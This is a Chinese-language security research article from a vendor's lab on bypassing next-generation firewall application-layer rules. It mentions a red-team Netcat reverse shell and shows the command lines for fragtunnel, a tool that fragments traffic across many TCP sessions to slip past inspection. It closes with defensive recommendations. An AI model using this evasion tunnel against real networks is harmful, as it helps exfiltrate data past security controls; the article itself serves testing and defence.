---
title: 针对NGFW的防护规则绕过方法研究
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247507012&idx=1&sn=1eb650f0e5e0e24190f034a871d25cf5&chksm=fa5209facd2580ec7bc7ecf40c85a27c6270db590bd9be8910adbebf4a2e87ae2156c17f0968&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-07-16
fetch_date: 2025-10-06T17:44:43.766524
---

# 针对NGFW的防护规则绕过方法研究

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k1RBKkZRLQvAzv4IvC6UQ1NyEaGaP2eCVNMlCfaKibwbauDmNEorjiblxg/0?wx_fmt=jpeg)

# 针对NGFW的防护规则绕过方法研究

原创

山石网科情报中心

山石网科安全技术研究院

背景

Next Generation Firewall（NGFW）是传统状态防火墙和统一威胁管理设备的下一代产品。它不仅包含传统防火墙的全部功能（基础包过滤、状态检测、NAT、VPN等）还集成了应用和用户的识别和控制、入侵防御等更高级的安全能力。相对于UTM设备，NGFW则拥有更快处理效率和更强的外部拓展、联动能力。

NGFW特点包含：

* 阻止/允许：IP 地址、TCP/UDP 端口、正在使用的应用程序、内容；
* 更多 OSI 层；
* 集成 IDS/IPS 功能；
* 扩展其它联动功能；

本次我们将围绕OSI第七层展开NGFW的绕过方案探索。

一些探索

当我们红队在测试某防火墙出口流量时，预期只有团队规定的80和443端口放行，但是我们发现很多端口被放行了。我们尝试SSH，FTP连接内部服务器均没有成功。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k1l4QWQK7aAuLLDaJjZFDk9CMoJkD6fIp6m9AfxVKqlQGlia0k4Bv0mbA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k1C4phmlXj83SE2dsn659JxvyXkC6H5rcNC7QQuGhWib8yHCOtkAAR16g/640?wx_fmt=png&from=appmsg)

最后我们使用 Netcat 的反向 shell 成功，但不久后就被阻止了。尽管如此，还是有一些数据发送到了目标服务器！

所以NGFW到底在TCP连接的哪个阶段进行BLOCK的？通过翻看思科的文档找到了答案，思科的FTD使用Snort：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k1przosqJFr0DbI7jhV8peXjicFHwDO4apvMSHma5zIrsed2Zrfbr1FvQ/640?wx_fmt=png&from=appmsg)

三次握手中，IPS/IDS 引擎将首先允许某些数据包，直到引擎能够确定这是否是不良/恶意流量。它解释了为什么端口扫描显示端口已打开，但尝试连接这些服务却失败。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k194SLdcgPlElqMs1uYOsrlfmuUEia58fTPXIj8d0thsQEiaSZ9M7XXPSg/640?wx_fmt=png&from=appmsg)

所以是设计缺陷？

我们现在看一下标准的CS交互逻辑，client发送socket（针对的是应用层探索）请求，server解析并建立连接，然后交互数据最后关闭：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k1UibMaSzxEns1NibQ1gCZ2wTEiazqwrAot8wmrnAFgibW4rJQEntrPK7fkA/640?wx_fmt=png&from=appmsg)

假如我们在关闭会话之后，循环的向某个服务器发送请求数据，是否就达到的“数据泄露”目的了？

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k19qXYEsHkuc7vzlkNsNrCZUsYwwPiaFq02I12LofrYKNiaqSFniaUj2WCA/640?wx_fmt=png&from=appmsg)

DEMO

我们使用Palo Alto和Cisco防火墙用于测试，假设有如下规则，防火墙只允许网页浏览和80、443端口。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQpwBfkgA4uol1Yrurxp7k1xY6F0BsOoCEeZLqHF5tF5ibGiayMUeSexoDVjibIJ553fJqKibx5BIibEKg/640?wx_fmt=png&from=appmsg)

* 用Python编写的TCP隧道工具
* 将应用程序的流量通过隧道传输到目标服务器，从而绕过 NGFW
* 从应用程序接收到的数据被分割成更小的片段
* 每个片段都在不同的 TCP 会话中一一发送
* 从隧道出来的数据被合并以形成原始数据
* 原始数据发送到最终目标

脚本查看参考链接文档和脚本。或者使用附件脚本。

设置隧道服务器：

```
python fragtunnel.py -b <interface-ip>:<port-to-listen>
```

设置client：

```
python fragtunnel.py -p <local-port-to-listen> -t <target-server-address>:<target-server-port> -T <tunnel-server-address>:<tunnel-server-port>
```

建议

1. NGFW不能只依赖第七层（应用层）策略。相反，如果可能的话，我们应该在第 3 层和第 4 层阻止任何不需要的内容，然后在第 3 层制定规则;
2. 如果可能，设置和使用更细粒度的第 7 层策略:

   a) 将应用程序列入白名单，如果可能，具体到允许它应该与之通信的域；

   b) 应用程序应与其通信的允许列表服务器 IP（第 3 层）

   c) 应用程序应使用的协议（第 4 层 -7 层）
3. 防护：使用相同端口从同一源到同一目的地大量重复 TCP 握手可能是妥协和可能泄露的指标

参考链接

* https://github.com/efeali/fragtunnel/blob/main/fragtunnel.py
* Network Application Firewalls: Exploits and Defenses, Defcon 2011, Brad Woodberg
* Bypassing Next-Gen Firewall Rules, Nolasec 2012, Dave Laselle
* Sinking the Next Generation Firewall, Derbycon 2016, Russel Butturini
* Chunky Cookies: Smashing Application Aware Defenses, BSides Nashville 2017, Russel Butturini

‍‍‍‍

‍

关于山石网科情报团队

山石网科情报中心，涵盖威胁情报狩猎运维和入侵检测与防御团队。 山石网科情报中心专注于保护数字世界的安全。以情报狩猎、攻击溯源和威胁分析为核心，团队致力于预防潜在攻击、应对安全事件。山石网科情报中心汇集网络安全、计算机科学、数据分析等专家，多学科融合确保全面的威胁分析。我们积极创新，采用新工具和技术提升分析效率。团队协同合作，分享信息与见解，追求卓越，为客户保驾护航。无论是防范未来威胁还是应对当下攻击，我们努力确保数字世界安全稳定。其中山石网科网络入侵检测防御系统，是山石网科公司结合多年应用安全的攻防理论和应急响应实践经验积累的基础上自主研发完成，满足各类法律法规如 PCI、等级保护、企业内部控制规范等要求。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSZmibNONzibea8WkcAFcdQcXicIYgWuvOtR8HqlqJ68Avib679FBGHYqxRibldppr6etXJxxWRrlBToiaw/0?wx_fmt=png)

山石网科安全技术研究院

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSZmibNONzibea8WkcAFcdQcXicIYgWuvOtR8HqlqJ68Avib679FBGHYqxRibldppr6etXJxxWRrlBToiaw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过